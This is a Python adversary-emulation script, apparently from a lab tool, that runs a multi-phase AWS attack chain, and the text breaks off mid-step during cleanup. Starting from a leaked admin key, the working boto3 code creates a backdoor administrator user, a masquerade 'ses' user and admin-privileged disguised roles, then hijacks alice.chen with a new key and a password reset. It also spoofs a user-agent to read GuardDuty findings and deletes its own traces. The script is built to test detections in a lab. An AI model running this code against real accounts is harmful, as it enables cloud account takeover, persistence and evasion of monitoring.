"""
DangerDev — Automated Post-Exploitation Attack Script
MayaTrail Adversary Emulation | AWS | 3-Phase | 17 Steps

Executes the complete DangerDev attack chain: credential theft from leaked
terraform.tfstate → IAM persistence → compute recon → cross-account backdoors
→ account hijacking → indicator removal → phishing infrastructure.

Steps 16-17 (domain acquisition, SES phishing) make REAL AWS calls as alice.chen's
hijacked key, with the harmful outcomes refused by IAM rather than by this script:
RegisterDomain / PutAccountDetails / UpdateAccountSendingEnabled are deny-guarded
(CloudTrail records the AccessDenied attempt) and SendEmail is IAM-restricted to the
SES mailbox simulator from an unverifiable lab identity (expected MessageRejected).

Entry point: run(outputs, region) — called by the run_emulation_attack Celery
task. The leaked lab-infra-admin credential is read from the Pulumi stack outputs
(admin_access_key_id / admin_access_key_secret); that same credential performs the
Step 15 / post-17 self-cleanup of the attack-created IAM principals.
"""

import json
import logging
import random
import re
import socket
import time
from datetime import datetime, timezone

import boto3
from botocore.exceptions import ClientError

logger = logging.getLogger(__name__)


# ─── Output helpers ────────────────────────────────────────────────────────────

def print_step(msg):
    print(f"\n[*] {msg}")

def print_ok(msg):
    print(f"[+] {msg}")

def print_err(msg):
    print(f"[-] {msg}")

def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))

def phase_delay():
    time.sleep(random.uniform(5, 15))


# ─── Credential store ─────────────────────────────────────────────────────────

class CredentialStore:
    """Manages multiple boto3 Sessions keyed by credential ID with lifecycle tracking."""

    def __init__(self):
        self._store: dict = {}
        self._active: str | None = None

    def add(self, cred_id: str, session: boto3.Session, meta: dict = None):
        self._store[cred_id] = {"session": session, "meta": meta or {}, "valid": True}

    def activate(self, cred_id: str):
        self._active = cred_id

    def get(self, cred_id: str = None) -> boto3.Session:
        key = cred_id or self._active
        entry = self._store.get(key)
        if not entry:
            raise KeyError(f"Credential '{key}' not in store")
        return entry["session"]

    def meta(self, cred_id: str) -> dict:
        return self._store.get(cred_id, {}).get("meta", {})

    def invalidate(self, cred_id: str):
        if cred_id in self._store:
            self._store[cred_id]["valid"] = False

    def has(self, cred_id: str) -> bool:
        return cred_id in self._store and self._store[cred_id]["valid"]


def make_session(key_id: str, secret: str, region: str) -> boto3.Session:
    return boto3.Session(
        aws_access_key_id=key_id,
        aws_secret_access_key=secret,
        region_name=region,
    )


def boto_client(creds: CredentialStore, service: str,
                cred_id: str = None, **kwargs):
    # Region is inherited from the session (built with the run() region).
    return creds.get(cred_id).client(service, **kwargs)


# ─── Out-of-band artifact identifiers ───────────────────────────────────────────
# Artifacts the attack creates OUTSIDE Pulumi's state.  `pulumi destroy` cannot
# remove them (AWS refuses to delete a role with an attached managed policy Pulumi
# does not manage; an SES identity is not in the stack at all), so they are
# defined once here and consumed by BOTH the attack steps that create them and
# remediate_out_of_band() that tears them down — never drifting apart.
BACKDOOR_ROLE_NAMES = ["AWSeservedSSO_AdminAccess", "AWSLanding-Zones-ConfigRecorderRoles"]
SES_LAB_IDENTITY = "emulation-noreply@emulation-lab-noreply.example.com"
ADMINISTRATOR_ACCESS_ARN = "arn:aws:iam::aws:policy/AdministratorAccess"


# ─── Audit event log ──────────────────────────────────────────────────────────

_events: list[dict] = []

def record(step: int, technique: str, api_calls: list[str], outcome: str):
    _events.append({
        "step": step,
        "technique": technique,
        "api_calls": api_calls,
        "outcome": outcome,
        "ts": datetime.now(timezone.utc).isoformat(),
    })


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 1 — Initial Access and Persistence Establishment
# Techniques: T1078.004, T1526, T1087.004, T1136.003, T1098.003
# Credential:  leaked_admin_session (lab-infra-admin key from bait tfstate)
# ═══════════════════════════════════════════════════════════════════════════════

def phase1(creds: CredentialStore, account_id: str, region: str) -> str:
    """Returns resolved account_id (may be populated here if not pre-set)."""
    print("\n" + "=" * 70)
    print("PHASE 1 — Initial Access and Persistence Establishment")
    print("=" * 70)

    iam = boto_client(creds, "iam", "leaked_admin_session")

    # ── Step 1 · T1078.004 — Bootstrap from leaked lab-infra-admin credential ─
    # DangerDev opsec: never call GetCallerIdentity; use GetUser instead to
    # avoid the "Unauthenticated" identity-check fingerprint in SIEM rules.
    print_step("Step 1 [T1078.004] Bootstrap from leaked lab-infra-admin credential (no GetCallerIdentity)")
    try:
        resp = iam.get_user()
        user_arn = resp["User"]["Arn"]
        print_ok(f"GetUser: {resp['User']['UserName']} ({user_arn})")
        if not account_id:
            account_id = user_arn.split(":")[4]
            print_ok(f"Resolved ACCOUNT_ID from ARN: {account_id}")
    except ClientError as e:
        print_err(f"GetUser: {e}")

    op_delay(1, 3)

    try:
        resp = iam.list_attached_user_policies(UserName="lab-infra-admin")
        policies = [p["PolicyName"] for p in resp["AttachedPolicies"]]
        print_ok(f"ListAttachedUserPolicies: {policies}")
    except ClientError as e:
        print_err(f"ListAttachedUserPolicies: {e}")

    op_delay(3, 8)
    record(1, "T1078.004", ["iam:GetUser", "iam:ListAttachedUserPolicies"], "success")

    # ── Step 2 · T1526 — SES service discovery ────────────────────────────────
    # Assesses account sending capacity before committing to phishing operations.
    print_step("Step 2 [T1526] SES sending capacity enumeration")
    ses_client = boto_client(creds, "ses", "leaked_admin_session")

    try:
        quota = ses_client.get_send_quota()
        print_ok(f"GetSendQuota: Max24h={quota['Max24HourSend']}, "
                 f"SentLast24h={quota['SentLast24Hours']}, "
                 f"MaxSendRate={quota['MaxSendRate']}")
    except ClientError as e:
        print_err(f"GetSendQuota: {e}")

    op_delay(1, 2)

    try:
        identities = ses_client.list_identities(IdentityType="Domain")
        print_ok(f"ListIdentities (Domain): {identities['Identities']}")
    except ClientError as e:
        print_err(f"ListIdentities: {e}")

    op_delay(2, 5)
    record(2, "T1526", ["ses:GetSendQuota", "ses:ListIdentities"], "success")

    # ── Step 3 · T1087.004 — IAM user enumeration ────────────────────────────
    # Maps existing accounts for targeting; identifies ses-smtp-user.* naming
    # pattern that informs masquerade design in Step 10.
    print_step("Step 3 [T1087.004] IAM user enumeration")
    users: list[str] = []
    try:
        resp = iam.list_users()
        users = [u["UserName"] for u in resp["Users"]]
        print_ok(f"ListUsers ({len(users)} users): {users}")
    except ClientError as e:
        print_err(f"ListUsers: {e}")

    op_delay(1, 4)
    record(3, "T1087.004", ["iam:ListUsers"], "success")

    # ── Step 4 · T1136.003 — Create DangerDev@protonmail.me backdoor account ─
    # Email-format username is immediately anomalous in CloudTrail but blends
    # with personal-account patterns DangerDev adopted in tracked incidents.
    print_step("Step 4 [T1136.003] Create IAM backdoor user DangerDev@protonmail.me")
    dd_key_id: str | None = None
    dd_secret: str | None = None

    try:
        iam.create_user(UserName="DangerDev@protonmail.me")
        print_ok("CreateUser: DangerDev@protonmail.me")
    except ClientError as e:
        if e.response["Error"]["Code"] == "EntityAlreadyExists":
            print_ok("CreateUser: DangerDev@protonmail.me already exists, continuing")
        else:
            print_err(f"CreateUser: {e}")

    op_delay(1, 2)

    try:
        iam.create_login_profile(
            UserName="DangerDev@protonmail.me",
            Password="Temp@12345!Lab",
            PasswordResetRequired=False,
        )
        print_ok("CreateLoginProfile: DangerDev@protonmail.me")
    except ClientError as e:
        if e.response["Error"]["Code"] == "EntityAlreadyExists":
            print_ok("CreateLoginProfile: profile already exists")
        else:
            print_err(f"CreateLoginProfile: {e}")

    op_delay(1, 2)

    try:
        key_resp = iam.create_access_key(UserName="DangerDev@protonmail.me")
        dd_key_id = key_resp["AccessKey"]["AccessKeyId"]
        dd_secret = key_resp["AccessKey"]["SecretAccessKey"]
        print_ok(f"CreateAccessKey: {dd_key_id} → dangerdev_user_key captured")
    except ClientError as e:
        print_err(f"CreateAccessKey DangerDev: {e}")

    if not dd_key_id:
        raise RuntimeError("Could not create DangerDev@protonmail.me access key — aborting")

    dd_session = make_session(dd_key_id, dd_secret, region)
    creds.add("dangerdev_session", dd_session, {
        "key_id": dd_key_id,
        "secret": dd_secret,
        "username": "DangerDev@protonmail.me",
    })

    op_delay(2, 6)
    record(4, "T1136.003", [
        "iam:CreateUser", "iam:CreateLoginProfile", "iam:CreateAccessKey"
    ], "success")

    # ── Step 5 · T1098.003 — Grant AdministratorAccess, pivot active session ─
    # Final call from leaked_admin_session; all subsequent phases use
    # dangerdev_session to distance activity from the originally leaked key.
    print_step("Step 5 [T1098.003] Attach AdministratorAccess to DangerDev@protonmail.me, pivot credential")
    try:
        iam.attach_user_policy(
            UserName="DangerDev@protonmail.me",
            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
        )
        print_ok("AttachUserPolicy: AdministratorAccess → DangerDev@protonmail.me")
    except ClientError as e:
        print_err(f"AttachUserPolicy: {e}")

    creds.activate("dangerdev_session")
    print_ok("Active credential pivoted → dangerdev_session (dangerdev_user_key)")

    op_delay(4, 10)
    record(5, "T1098.003", ["iam:AttachUserPolicy"], "success")

    return account_id


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 2 — Infrastructure Discovery and Compute Deployment
# Techniques: T1580, T1578.002, T1021.001, T1496
# Credential:  dangerdev_session (DangerDev@protonmail.me key)
# ═══════════════════════════════════════════════════════════════════════════════

def phase2(creds: CredentialStore, account_id: str, region: str):
    print("\n" + "=" * 70)
    print("PHASE 2 — Infrastructure Discovery and Compute Deployment")
    print("=" * 70)
    phase_delay()

    ec2 = boto_client(creds, "ec2")

    # ── Step 6 · T1580 — Cloud infrastructure discovery ──────────────────────
    # GPU instance type filter (p3.*, p4d.*, g4dn.*) is a mining-candidate
    # reconnaissance signature observed in DangerDev CloudTrail telemetry.
    print_step("Step 6 [T1580] EC2 infrastructure enumeration from DangerDev@protonmail.me")

    try:
        resp = ec2.describe_regions()
        print_ok(f"DescribeRegions: {len(resp['Regions'])} regions")
    except ClientError as e:
        print_err(f"DescribeRegions: {e}")

    op_delay(1, 2)

    try:
        resp = ec2.describe_instances()
        instances = [i for r in resp["Reservations"] for i in r["Instances"]]
        print_ok(f"DescribeInstances: {len(instances)} instance(s)")
    except ClientError as e:
        print_err(f"DescribeInstances: {e}")

    op_delay(1, 2)

    try:
        resp = ec2.describe_security_groups()
        print_ok(f"DescribeSecurityGroups: {len(resp['SecurityGroups'])} groups")
    except ClientError as e:
        print_err(f"DescribeSecurityGroups: {e}")

    op_delay(1, 2)

    try:
        resp = ec2.describe_vpcs()
        print_ok(f"DescribeVpcs: {len(resp['Vpcs'])} VPCs")
    except ClientError as e:
        print_err(f"DescribeVpcs: {e}")

    op_delay(1, 2)

    try:
        resp = ec2.describe_instance_types(
            Filters=[{"Name": "instance-type", "Values": ["p3.*", "p4d.*", "g4dn.*"]}]
        )
        gpu_types = [t["InstanceType"] for t in resp["InstanceTypes"]]
        print_ok(f"DescribeInstanceTypes (GPU mining candidates): {gpu_types}")
    except ClientError as e:
        print_err(f"DescribeInstanceTypes: {e}")

    op_delay(1, 2)

    try:
        resp = ec2.describe_availability_zones()
        zones = [z["ZoneName"] for z in resp["AvailabilityZones"]]
        print_ok(f"DescribeAvailabilityZones: {zones}")
    except ClientError as e:
        print_err(f"DescribeAvailabilityZones: {e}")

    op_delay(2, 6)
    record(6, "T1580", [
        "ec2:DescribeRegions", "ec2:DescribeInstances", "ec2:DescribeSecurityGroups",
        "ec2:DescribeVpcs", "ec2:DescribeInstanceTypes", "ec2:DescribeAvailabilityZones",
    ], "success")

    # ── Step 7 · T1578.002 — Launch t2.micro test instance, validate, terminate
    # DangerDev pattern: test instance lifecycle before committing GPU spend.
    # t2.micro substituted for p3.16xlarge (GPU mining is documented-only).
    print_step("Step 7 [T1578.002] Launch t2.micro Windows test instance, confirm running, terminate")

    open_sg_id: str | None = None
    public_subnet_id: str | None = None

    try:
        sgs = ec2.describe_security_groups(
            Filters=[{"Name": "tag:Name", "Values": ["dangerdev-open-sg"]}]
        )
        if sgs["SecurityGroups"]:
            open_sg_id = sgs["SecurityGroups"][0]["GroupId"]
            print_ok(f"Resolved dangerdev-open-sg: {open_sg_id}")
    except ClientError as e:
        print_err(f"Resolve dangerdev-open-sg: {e}")

    try:
        subnets = ec2.describe_subnets(
            Filters=[{"Name": "tag:Name", "Values": ["dangerdev-public-subnet"]}]
        )
        if subnets["Subnets"]:
            public_subnet_id = subnets["Subnets"][0]["SubnetId"]
            print_ok(f"Resolved dangerdev-public-subnet: {public_subnet_id}")
    except ClientError as e:
        print_err(f"Resolve dangerdev-public-subnet: {e}")

    ami_id: str | None = None
    ssm_client = boto_client(creds, "ssm")
    try:
        param = ssm_client.get_parameter(
            Name="/aws/service/ami-windows-latest/Windows_Server-2022-English-Full-Base",
            WithDecryption=False,
        )
        ami_id = param["Parameter"]["Value"]
        print_ok(f"GetParameter (Windows Server 2022 AMI): {ami_id}")
    except ClientError as e:
        print_err(f"GetParameter: {e}")

    test_instance_id: str | None = None
    if ami_id and open_sg_id and public_subnet_id:
        try:
            run_resp = ec2.run_instances(
                ImageId=ami_id,
                InstanceType="t2.micro",
                MinCount=1,
                MaxCount=1,
                KeyName="dangerdev-lab-key",
                SecurityGroupIds=[open_sg_id],
                SubnetId=public_subnet_id,
                TagSpecifications=[{
                    "ResourceType": "instance",
                    "Tags": [
                        {"Key": "Name",      "Value": "dangerdev-test-instance"},
                        {"Key": "MayaTrail", "Value": "true"},
                    ],
                }],
            )
            test_instance_id = run_resp["Instances"][0]["InstanceId"]
            print_ok(f"RunInstances: {test_instance_id} (dangerdev-test-instance)")
        except ClientError as e:
            print_err(f"RunInstances: {e}")
    else:
        print_err("Skipping RunInstances — could not resolve AMI / SG / subnet")

    if test_instance_id:
        print_step(f"Polling {test_instance_id} for 'running' state (up to 120s)")
        for _ in range(12):
            time.sleep(10)
            try:
                status_resp = ec2.describe_instance_status(
                    InstanceIds=[test_instance_id],
                    IncludeAllInstances=True,
                )
                statuses = status_resp.get("InstanceStatuses", [])
                state = statuses[0]["InstanceState"]["Name"] if statuses else "pending"
                print_ok(f"DescribeInstanceStatus: {test_instance_id} → {state}")
                if state == "running":
                    break
            except ClientError as e:
                print_err(f"DescribeInstanceStatus: {e}")

        op_delay(5, 10)

        try:
            ec2.terminate_instances(InstanceIds=[test_instance_id])
            print_ok(f"TerminateInstances: {test_instance_id} terminated")
        except ClientError as e:
            print_err(f"TerminateInstances: {e}")

    op_delay(30, 60)
    record(7, "T1578.002", [
        "ssm:GetParameter", "ec2:RunInstances",
        "ec2:DescribeInstanceStatus", "ec2:TerminateInstances",
    ], "success")

    # ── Step 8 · T1021.001 — TCP SYN probe to port 3389 ──────────────────────
    # Pure Python socket — not a boto3 API call. Generates ACCEPT record in
    # VPC Flow Logs on the dangerdev-sandbox-vpc. No interactive RDP session.
    print_step("Step 8 [T1021.001] TCP SYN probe to dangerdev-ec2-windows-instance:3389")

    windows_public_ip: str | None = None
    try:
        resp = ec2.describe_instances(
            Filters=[{"Name": "tag:Name", "Values": ["dangerdev-ec2-windows-instance"]}]
        )
        for reservation in resp["Reservations"]:
            for inst in reservation["Instances"]:
                if inst.get("State", {}).get("Name") == "running":
                    windows_public_ip = inst.get("PublicIpAddress")
                    print_ok(f"Resolved dangerdev-ec2-windows-instance IP: {windows_public_ip}")
                    break
            if windows_public_ip:
                break
    except ClientError as e:
        print_err(f"DescribeInstances (windows): {e}")

    if windows_public_ip:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((windows_public_ip, 3389))
            sock.close()
            status = "OPEN" if result == 0 else f"CLOSED/FILTERED (errno={result})"
            print_ok(f"TCP SYN {windows_public_ip}:3389 → {status} (VPC Flow Log ACCEPT record generated)")
        except Exception as e:
            print_err(f"TCP probe: {e}")
    else:
        print_err("Could not resolve Windows instance public IP — skipping TCP probe")

    op_delay(5, 15)
    record(8, "T1021.001", [
        "ec2:DescribeInstances", "socket.connect_ex(:3389) [data-plane only]"
    ], "success")

    # ── Step 9 · T1496 — Resource Hijacking (UserData / host_attack) ──────────
    # HOST_ATTACK — deployed in UserData PowerShell on dangerdev-ec2-windows-instance.
    # A 5-minute Math.Sqrt CPU loop runs at instance boot, followed by:
    #   New-EventLog -Source "Application" -LogName Application (if not exists)
    #   Write-EventLog -EventId 9999 -Source "Application" -LogName Application \
    #     -Message "T1496: simulated crypto workload complete"
    # Observable via CloudWatch CPUUtilization spike and Windows Application EventLog.
    # attack.py does NOT trigger this step — it runs automatically at EC2 boot.
    print_step("Step 9 [T1496] UserData/host_attack: CPU simulation pre-deployed in EC2 UserData (not in attack.py)")
    record(9, "T1496", [], "userdata_only — see EC2 UserData PowerShell")


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 3 — Persistence Hardening, Collection, Evasion, Phishing Infrastructure
# Techniques: T1036.005, T1199, T1098, T1530, T1518.001, T1070, T1583.001, T1566.002
# Credential:  dangerdev_session → alice_hijacked_session (steps 16-17, deny-guarded)
# ═══════════════════════════════════════════════════════════════════════════════

def phase3(creds: CredentialStore, account_id: str, region: str):
    print("\n" + "=" * 70)
    print("PHASE 3 — Persistence Hardening, Collection, Evasion, Phishing Infrastructure")
    print("=" * 70)
    phase_delay()

    iam = boto_client(creds, "iam")

    # ── Step 10 · T1036.005 — Create 'ses' masquerade user ────────────────────
    # 'ses' blends with SES auto-generated SMTP credential usernames like
    # ses-smtp-user.20231105-091212 that are visible in ListUsers output.
    print_step("Step 10 [T1036.005] Create 'ses' masquerade user; inspect backdoor roles")
    ses_key_id: str | None = None

    try:
        iam.create_user(UserName="ses")
        print_ok("CreateUser: ses (masquerades as ses-smtp-user.* SES service accounts)")
    except ClientError as e:
        if e.response["Error"]["Code"] == "EntityAlreadyExists":
            print_ok("CreateUser: 'ses' already exists")
        else:
            print_err(f"CreateUser 'ses': {e}")

    op_delay(1, 2)

    try:
        key_resp = iam.create_access_key(UserName="ses")
        ses_key_id = key_resp["AccessKey"]["AccessKeyId"]
        ses_secret = key_resp["AccessKey"]["SecretAccessKey"]
        ses_session = make_session(ses_key_id, ses_secret, region)
        creds.add("ses_masquerade_session", ses_session, {
            "key_id": ses_key_id,
            "secret": ses_secret,
            "username": "ses",
        })
        print_ok(f"CreateAccessKey (ses): {ses_key_id} → ses_masquerade_session captured (not used for further calls)")
    except ClientError as e:
        print_err(f"CreateAccessKey 'ses': {e}")

    op_delay(1, 2)

    try:
        resp = iam.list_roles(PathPrefix="/")
        role_names = [r["RoleName"] for r in resp["Roles"]]
        print_ok(f"ListRoles: {len(role_names)} roles found")
        for name in role_names:
            if any(kw in name for kw in ("SSO", "ConfigRecorder", "Landing", "Reserved")):
                print_ok(f"  → Notable: {name}")
    except ClientError as e:
        print_err(f"ListRoles: {e}")

    op_delay(1, 2)

    for role_name in BACKDOOR_ROLE_NAMES:
        try:
            role = iam.get_role(RoleName=role_name)
            trust_doc = json.dumps(role["Role"]["AssumeRolePolicyDocument"])
            print_ok(f"GetRole {role_name}: trust={trust_doc[:100]}...")
        except ClientError as e:
            print_err(f"GetRole {role_name}: {e}")
        op_delay(1, 2)

    op_delay(2, 6)
    record(10, "T1036.005", [
        "iam:CreateUser(ses)", "iam:CreateAccessKey(ses)",
        "iam:ListRoles", "iam:GetRole(AWSeservedSSO_AdminAccess)",
        "iam:GetRole(AWSLanding-Zones-ConfigRecorderRoles)",
    ], "success")

    # ── Step 11 · T1199 — Wire cross-account backdoor roles ───────────────────
    # AttachRolePolicy is idempotent — safe to call on Pulumi-managed roles.
    # AssumeRole returns AccessDenied from the victim account (expected); the
    # trust policy requires the adversary account principal. CloudTrail still
    # logs the AssumeRole event, validating the detection rule.
    print_step("Step 11 [T1199] Attach AdministratorAccess to backdoor roles; verify AssumeRole (expected AccessDenied)")

    for role_name in BACKDOOR_ROLE_NAMES:
        try:
            iam.attach_role_policy(
                RoleName=role_name,
                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
            )
            print_ok(f"AttachRolePolicy: AdministratorAccess → {role_name}")
        except ClientError as e:
            print_err(f"AttachRolePolicy {role_name}: {e}")
        op_delay(1, 2)

    sts_client = boto_client(creds, "sts")
    try:
        sts_client.assume_role(
            RoleArn=f"arn:aws:iam::{account_id}:role/AWSeservedSSO_AdminAccess",
            RoleSessionName="dangerdev-backdoor-verify",
        )
        print_ok("AssumeRole: UNEXPECTED SUCCESS — trust policy may be misconfigured")
    except ClientError as e:
        code = e.response["Error"]["Code"]
        if code in ("AccessDenied", "AccessDeniedException"):
            # Expected: cross-account trust requires adversary account principal
            print_ok("AssumeRole → AccessDenied [EXPECTED_FAILURE]: cross-account trust correctly wired; CloudTrail event generated")
        else:
            print_err(f"AssumeRole unexpected error ({code}): {e}")

    op_delay(3, 8)
    record(11, "T1199", [
        "iam:AttachRolePolicy(AWSeservedSSO_AdminAccess)",
        "iam:AttachRolePolicy(AWSLanding-Zones-ConfigRecorderRoles)",
        "sts:AssumeRole [EXPECTED_FAILURE: AccessDenied]",
    ], "expected_failure_ok")

    # ── Step 12 · T1098 — Hijack alice.chen (persistent access post-cleanup) ─
    # Creating a second access key on alice.chen ensures the attacker retains
    # access after DangerDev@protonmail.me is deleted in Step 15.
    print_step("Step 12 [T1098] Create second access key on alice.chen; reset console password")
    alice_key_id: str | None = None

    # Pre-rotate: if alice already has 2 keys (quota = 2), delete the newest one
    # (stale hijacked key from a prior run); keep the oldest (Pulumi-managed).
    try:
        existing_keys = iam.list_access_keys(UserName="alice.chen")["AccessKeyMetadata"]
        if len(existing_keys) >= 2:
            newest = max(existing_keys, key=lambda k: k["CreateDate"])
            try:
                iam.delete_access_key(UserName="alice.chen", AccessKeyId=newest["AccessKeyId"])
                print_ok(f"Pre-rotate: deleted stale alice.chen key {newest['AccessKeyId']} (at 2-key quota)")
            except ClientError as de:
                print_err(f"Pre-rotate DeleteAccessKey alice.chen: {de}")
    except ClientError as e:
        print_err(f"ListAccessKeys alice.chen (pre-create check): {e}")

    try:
        key_resp = iam.create_access_key(UserName="alice.chen")
        alice_key_id = key_resp["AccessKey"]["AccessKeyId"]
        alice_secret = key_resp["AccessKey"]["SecretAccessKey"]
        alice_session = make_session(alice_key_id, alice_secret, region)
        creds.add("alice_hijacked_session", alice_session, {
            "key_id": alice_key_id,
            "secret": alice_secret,
            "username": "alice.chen",
        })
        print_ok(f"CreateAccessKey (alice.chen): {alice_key_id} -> alice.chen now has 2 active keys (Security Hub IAM.3 trigger)")
    except ClientError as e:
        print_err(f"CreateAccessKey alice.chen: {e}")

    op_delay(1, 2)

    try:
        iam.update_login_profile(
            UserName="alice.chen",
            Password="Pwn3d@Lab!999",
            PasswordResetRequired=False,
        )
        print_ok("UpdateLoginProfile: alice.chen password reset — persistent console access secured")
    except ClientError as e:
        print_err(f"UpdateLoginProfile alice.chen: {e}")

    op_delay(2, 5)
    record(12, "T1098", [
        "iam:CreateAccessKey(alice.chen)", "iam:UpdateLoginProfile(alice.chen)"
    ], "success")

    # ── Step 13 · T1530 — S3 and IAM enumeration ─────────────────────────────
    # Mirrors DangerDev's observed enumeration cluster: S3 discovery, instance
    # profiles, group membership, and SSH key checks all issued in rapid burst.
    print_step("Step 13 [T1530] S3 bucket/object enumeration; IAM profile and key discovery")
    s3_client = boto_client(creds, "s3")

    bucket_names: list[str] = []
    try:
        resp = s3_client.list_buckets()
        bucket_names = [b["Name"] for b in resp["Buckets"]]
        print_ok(f"ListBuckets: {bucket_names}")
    except ClientError as e:
        print_err(f"ListBuckets: {e}")

    archive_bucket = next(
        (n for n in bucket_names if "prod-data-archive" in n),
        f"dangerdev-prod-data-archive-{account_id}",
    )

    op_delay(1, 2)

    try:
        resp = s3_client.list_objects_v2(Bucket=archive_bucket, MaxKeys=100)
        obj_keys = [o["Key"] for o in resp.get("Contents", [])]
        print_ok(f"ListObjectsV2 ({archive_bucket}): {obj_keys}")
    except ClientError as e:
        print_err(f"ListObjectsV2 {archive_bucket}: {e}")

    op_delay(1, 2)

    try:
        resp = iam.list_instance_profiles()
        names = [p["InstanceProfileName"] for p in resp["InstanceProfiles"]]
        print_ok(f"ListInstanceProfiles: {names}")
    except ClientError as e:
        print_err(f"ListInstanceProfiles: {e}")

    op_delay(1, 2)

    try:
        resp = iam.list_groups_for_user(UserName="DangerDev@protonmail.me")
        groups = [g["GroupName"] for g in resp["Groups"]]
        print_ok(f"ListGroupsForUser (DangerDev@protonmail.me): {groups}")
    except ClientError as e:
        print_err(f"ListGroupsForUser: {e}")

    op_delay(1, 2)

    try:
        resp = iam.list_ssh_public_keys(UserName="alice.chen")
        ssh_keys = resp.get("SSHPublicKeys", [])
        print_ok(f"ListSSHPublicKeys (alice.chen): {[k['SSHPublicKeyId'] for k in ssh_keys]}")
    except ClientError as e:
        print_err(f"ListSSHPublicKeys: {e}")

    op_delay(2, 6)
    record(13, "T1530", [
        "s3:ListBuckets", "s3:ListObjectsV2",
        "iam:ListInstanceProfiles", "iam:ListGroupsForUser", "iam:ListSSHPublicKeys",
    ], "success")

    # ── Step 14 · T1518.001 — GuardDuty findings review + permission probe ───
    # DangerDev fingerprint: GuardDuty access using an anomalous user-agent
    # resembling the RDS console string (observed in original incident telemetry).
    # SimulatePrincipalPolicy checks SSM/SecretsManager access without generating
    # telemetry on those services directly — indirect permission probing technique.
    print_step("Step 14 [T1518.001] GuardDuty review + SimulatePrincipalPolicy (anomalous RDS console user-agent)")

    dd_session_obj = creds.get("dangerdev_session")
    gd_client = dd_session_obj.client("guardduty")

    # Inject DangerDev's observed RDS console user-agent fingerprint
    def _inject_rds_ua(request, **kwargs):
        request.headers["User-Agent"] = (
            "aws-internal/3 aws-cli/1.27.78 Python/3.9.16 "
            "Linux/4.14.255-314-253.539.amzn2.x86_64 "
            "exec-env/AWS_ECS_EC2 botocore/1.29.78 RDS Console"
        )

    gd_client.meta.events.register("before-send.guardduty.*", _inject_rds_ua)

    detector_id: str | None = None
    try:
        resp = gd_client.list_detectors()
        if resp["DetectorIds"]:
            detector_id = resp["DetectorIds"][0]
            print_ok(f"ListDetectors: {detector_id}")
    except ClientError as e:
        print_err(f"ListDetectors: {e}")

    finding_ids: list[str] = []
    if detector_id:
        op_delay(1, 2)
        try:
            resp = gd_client.list_findings(
                DetectorId=detector_id,
                FindingCriteria={"Criterion": {"severity": {"Gte": 4}}},
            )
            finding_ids = resp.get("FindingIds", [])
            print_ok(f"ListFindings (severity ≥ 4): {len(finding_ids)} finding(s)")
        except ClientError as e:
            print_err(f"ListFindings: {e}")

        if finding_ids:
            op_delay(1, 2)
            try:
                details = gd_client.get_findings(
                    DetectorId=detector_id,
                    FindingIds=finding_ids[:10],
                )
                for f in details.get("Findings", []):
                    print_ok(f"  [{f['Severity']}] {f['Title']}")
            except ClientError as e:
                print_err(f"GetFindings: {e}")

    op_delay(1, 2)

    # Permission probe via SimulatePrincipalPolicy — avoids calling SSM/SecretsManager
    try:
        sim = iam.simulate_principal_policy(
            PolicySourceArn=f"arn:aws:iam::{account_id}:user/DangerDev@protonmail.me",
            ActionNames=[
                "ssm:GetParameter",
                "ssm:DescribeParameters",
                "secretsmanager:GetSecretValue",
                "secretsmanager:ListSecrets",
            ],
            ResourceArns=["*"],
        )
        for result in sim.get("EvaluationResults", []):
            print_ok(f"SimulatePrincipalPolicy: {result['EvalActionName']} → {result['EvalDecision']}")
    except ClientError as e:
        print_err(f"SimulatePrincipalPolicy: {e}")

    op_delay(2, 6)
    record(14, "T1518.001", [
        "guardduty:ListDetectors", "guardduty:ListFindings", "guardduty:GetFindings",
        "iam:SimulatePrincipalPolicy",
    ], "success")

    # ── Step 15 · T1070 — Indicator removal / self-cleanup ────────────────────
    # Mirrors DangerDev's observed self-cleanup pattern. Ironic note: all
    # DeleteUser and DetachUserPolicy events are fully logged in CloudTrail —
    # the cleanup attempt is itself a forensic indicator.
    # Self-deletion of DangerDev@protonmail.me requires LAB_OPERATOR_KEY because
    # an IAM user cannot call DeleteUser on itself while holding active credentials.
    print_step("Step 15 [T1070] Indicator removal: delete ses, delete DangerDev@protonmail.me (via LAB_OPERATOR_KEY)")

    ses_meta = creds.meta("ses_masquerade_session")
    ses_cleanup_key = ses_meta.get("key_id")

    if ses_cleanup_key:
        try:
            iam.update_access_key(
                UserName="ses", AccessKeyId=ses_cleanup_key, Status="Inactive"
            )
            print_ok(f"UpdateAccessKey ses/{ses_cleanup_key}: Inactive")
        except ClientError as e:
            print_err(f"UpdateAccessKey ses: {e}")

        op_delay(1, 2)

        try:
            iam.delete_access_key(UserName="ses", AccessKeyId=ses_cleanup_key)
            print_ok(f"DeleteAccessKey ses/{ses_cleanup_key}")
        except ClientError as e:
            print_err(f"DeleteAccessKey ses: {e}")

        op_delay(1, 2)

    try:
        iam.delete_user(UserName="ses")
        print_ok("DeleteUser: ses — masquerade account erased")
    except ClientError as e:
        print_err(f"DeleteUser ses: {e}")

    op_delay(2, 4)

    # lab-infra-admin (Administrator, a different principal than the backdoor
    # user) performs the self-cleanup deletions the pivoted session cannot.
    if creds.has("leaked_admin_session"):
        lab_iam = creds.get("leaked_admin_session").client("iam")
    else:
        lab_iam = None

    if lab_iam is None:
        print_err("leaked_admin_session unavailable — manual cleanup of DangerDev@protonmail.me required")
    else:

        try:
            lab_iam.detach_user_policy(
                UserName="DangerDev@protonmail.me",
                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
            )
            print_ok("DetachUserPolicy: AdministratorAccess ← DangerDev@protonmail.me")
        except ClientError as e:
            print_err(f"DetachUserPolicy DangerDev: {e}")

        op_delay(1, 2)

        try:
            all_keys = lab_iam.list_access_keys(UserName="DangerDev@protonmail.me")["AccessKeyMetadata"]
            for key in all_keys:
                kid = key["AccessKeyId"]
                try:
                    lab_iam.delete_access_key(UserName="DangerDev@protonmail.me", AccessKeyId=kid)
                    print_ok(f"DeleteAccessKey DangerDev@protonmail.me/{kid}")
                except ClientError as e:
                    print_err(f"DeleteAccessKey DangerDev/{kid}: {e}")
